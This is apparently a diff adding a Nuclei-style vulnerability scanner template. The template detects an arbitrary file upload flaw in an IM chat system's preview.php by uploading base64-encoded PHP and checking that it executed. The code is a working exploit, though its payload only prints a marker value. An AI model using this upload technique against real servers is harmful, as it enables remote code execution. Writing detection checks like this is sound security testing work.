@@ -1,0 +1,37 @@
+id: IM-preview_php-File-upload
+
+info:
+  name: IM 即时通讯系统 preview.php 任意文件上传漏洞
+  author: IM
+  severity: high
+  tags: File upload
+
+http:
+  - raw:
+      - |
+        POST /static/lib/webuploader/0.1.5/server/preview.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        data:image/php;base64,PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '([a-zA-Z0-9]{32,40}.php)'
+         internal: true
+  - raw:
+      - |
+        GET /static/lib/webuploader/0.1.5/server/preview/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
